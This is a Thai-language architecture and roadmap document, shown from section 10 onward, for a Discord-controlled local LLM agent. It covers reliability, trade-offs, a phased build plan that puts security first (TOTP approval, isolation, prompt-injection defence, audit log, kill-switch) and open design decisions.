| **+ Telegram แทน Discord** | กลาง (allowlist ง่ายกว่า) | — **แต่ยังต้อง out-of-band TOTP** (ช่องโหว่ approval-via-same-channel เหมือนกัน) |
| **Read-only mode** | ต่ำ (ตอบ+เรียกไฟล์ ห้าม mutate) | แก้เครื่องไม่ได้ — **แนะนำเป็นจุดเริ่ม** |
| **Tailscale + local web** | ต่ำ (ไม่มี public surface) | ต้องตั้ง VPN |
| **SSH-only, no daemon** | ต่ำสุด | สั่งจากมือถือไม่สะดวก |

---

## 10. Reliability

| ด้าน | กลยุทธ์ |
|---|---|
| Daemon ตาย (crash) | pm2/systemd auto-restart; Windows = Task Scheduler "restart on failure" |
| **Daemon ค้าง (hung, ไม่ crash)** | **watchdog/heartbeat** — process เขียน heartbeat เป็นระยะ; ไม่เต้นเกิน N วิ → ฆ่าแล้ว restart |
| **Crashloop** | exponential backoff ระหว่าง restart; เกิน K ครั้ง/หน้าต่างเวลา → หยุดถาวร + แจ้ง (กัน restart รัว) |
| LLM API error | retry 3 ครั้ง exponential backoff; fallback ไป model สำรอง |
| Tool error | try/catch → **redact** error (ไม่ leak path/stack/secret §5.3) → ส่งเป็น tool-result ให้ LLM จัดการ ไม่ crash |
| Session corrupt | เขียนแบบ atomic (temp file + rename) + per-session lock (§3.5); โหลดพัง→ เริ่ม session ใหม่ |
| **Audit-log durability** | audit log (§9.6) ต้อง flush/fsync + append-only; ไม่หายเมื่อ crash, restart แล้ว chain ต่อเนื่อง |
| **Kill-switch durability** | สถานะ "disarmed/panic" (§9.6) persist บน disk → restart แล้วยัง **ไม่กลับมา armed เอง** |
| **Pending approval** | persist (§3.5); restart → approval ที่ยังไม่หมดอายุคงอยู่, ที่หมดอายุ = deny |
| Budget overrun | นับ cost ต่อ session; เกิน limit → หยุด + แจ้ง Discord |
| Discord rate limit | queue ข้อความ, respect 429 retry-after |

---

## 11. Trade-off Analysis

| การตัดสินใจ | เลือก | ได้ | เสีย |
|---|---|---|---|
| LLM SDK | Vercel AI SDK | multi-provider, ไม่ lock-in, loop สำเร็จรูป | abstraction บัง low-level control |
| Memory store | Obsidian `.md` + wikilink | zero-DB, เปิดดู graph ได้, human-readable | ไม่มี query ซับซ้อนเท่า DB |
| LLM hosting | Ollama (local) | ฟรี, privacy, offline | ช้ากว่า/คุณภาพต่ำกว่า frontier API |
| Input channel | Discord | สะดวก, สั่งจากมือถือ | เปิด RCE surface ต้องล็อกแน่น |
| Approval | deny-by-default + out-of-band TOTP | ปลอดภัยแม้บัญชี Discord ถูกยึด (§9.3) | ต้องพิมพ์ TOTP ตอน mutate — ช้าลงนิด |
| Isolation | container / restricted user | RCE ถูกขังในกล่อง ไม่ถึง key/ระบบ (§9.5) | setup ยุ่งกว่า, บน Windows ต้องตั้ง user แยก |
| Architecture | daemon รันค้าง | พร้อมรับคำสั่งตลอด | กิน RAM, attack surface เปิด 24/7 |

---

## 12. Build Roadmap (เห็นทางว่าทำอะไรก่อน)

```
PHASE 1 — MVP "จำงานได้" (core)
  1. Tool loop (LLM + tool + วน) + hard step cap (§3.3)
  2. Session persistence (ต่อ cwd) + ★ per-session lock/queue (§3.5) — core ไม่ใช่ scale
  3. Project memory ฉีดเข้า system
  → ได้ agent ที่จำงานข้าม session ใน terminal

PHASE 2 — "ความรู้เป็น graph"
  4. remember/recall tool เขียนโน้ต [[link]] ลง Obsidian vault
  → เปิด Obsidian เห็น graph

PHASE 3 — "ปลอดภัยจริงระดับ assume-breach" ★★ ห้ามข้ามก่อน Phase 4
  5. Approval gate (deny-by-default) + CWD-scope (realpath/symlink) + argv allowlist
  6. ★ OS-level isolation: container / restricted user + argv exec + egress control (§9.5)
  7. ★ Secret broker — provider keys ออกนอก env ของ agent (§9.5)
  8. Prompt-injection defense + taint tracking (§9.4)
  9. ★ Audit log (hash-chained) + kill-switch + incident playbook (§9.6)
  10. ★ Security test suite — gate บังคับ ต้องผ่านก่อน Phase 4 (§9.8)

PHASE 4 — "รับคำสั่งจากระยะไกล"
  11. Discord adapter + AUTH GATE owner-ID (ทำคู่กัน)
  12. ★ Out-of-band approval (TOTP) + nonce/persist (§9.3) — ไม่ใช่ reaction อย่างเดียว
  13. Daemon (pm2/systemd/Task Scheduler) + watchdog/heartbeat (§10)
       → daemon รันเป็น dedicated low-priv user เท่านั้น (§9.5)

PHASE 5 — Scale / polish
  14. Compaction (per-model token window, prune เป็นคู่ §6.4)
  15. Multi-provider routing
  16. Semantic retrieval บน vault
  17. Memory-poisoning quarantine (§9.7) — เมื่อเริ่มอ่านเนื้อหาภายนอกบ่อย
```

**Reality check:** Phase 4 (Discord+คุมคอม) เขียนเร็ว แต่จะ **ปลอดภัยได้ก็ต่อเมื่อ Phase 3 แน่นแล้วเท่านั้น** —
โดยเฉพาะ **out-of-band approval (§9.3) + OS-isolation (§9.5)** ต้องพร้อมก่อนเปิด listener สู่ภายนอก
ถ้ายังไม่พร้อม ให้ใช้ **read-only mode** ไปก่อน (ดู §9.8 trust model)

---

## 13. สิ่งที่ต้องกลับมาทบทวนเมื่อระบบโต

- **Memory: flat → merge-store** — เมื่อโน้ตซ้ำเริ่มกวน ค่อยทำ dedup/supersede logic
- **Retrieval** — เมื่อ vault ใหญ่จน inject ทั้งหมดไม่ไหว ค่อยทำ semantic search ดึงเฉพาะส่วนเกี่ยว
- **Approval UX** — ถ้า allowlist รำคาญ พิจารณา "trusted session" ที่ผ่อนกฎชั่วคราว **แต่ต้อง: ARM ด้วย TOTP,
  auto-expire สั้น ๆ, ปิดทันทีเมื่อ context tainted (§9.4), และห้ามผ่อนสำหรับคำสั่งทำลายล้าง** (ไม่งั้นย้อนแย้ง §9)
- **Multi-channel** — ถ้าใช้หลาย channel/หลายอุปกรณ์ ต้องจัดการ session concurrency (per-session lock §3.5 รองรับแล้ว)
- **GUI control** — ถ้าต้องคุม app ที่ไม่มี CLI ค่อยเพิ่ม computer-use (vision + click/type) — surface ใหม่ ต้องประเมิน threat ใหม่
- **Observability (cost/perf)** — structured log + cost dashboard (คนละตัวกับ **security audit log** ซึ่งเป็น Phase 3 §9.6 ไม่ใช่ของเลื่อน)

---

## 14. Open Decisions (ต้องเคลียร์ก่อนเริ่ม)

| # | คำถาม | ตัวเลือก | คำแนะนำ (v1.1) |
|---|---|---|---|
| D1 | Hermes รันที่ไหน | Ollama local / OpenRouter / Nous Portal | local Ollama (ตรงกับ privacy goal §1.2) |
| D2 | Channel หลัก | Discord / Telegram / Tailscale+web | **เลือกอันไหนก็ต้อง out-of-band TOTP (§9.3)** — ทั้ง Discord และ Telegram มีช่องโหว่ approval-via-same-channel เหมือนกัน; Tailscale+web ลด public surface ได้มากสุดถ้ารับ VPN ได้ |
| D3 | เริ่มด้วย trust model ไหน | read-only ก่อน → ค่อยเปิด bash | **read-only ก่อน** (สอดคล้อง assume-breach) แล้วค่อย ARM bash หลัง §9 ครบ |
| D4 | สร้างเองทั้งหมด vs ต่อยอด `sanook-cli` | ขึ้นกับเป้าหมาย (เรียน vs ใช้งานจริง) | ถ้าต่อยอดของเดิม ต้อง **audit security surface ของมันก่อน** ว่าไม่ขัด §9 |
```
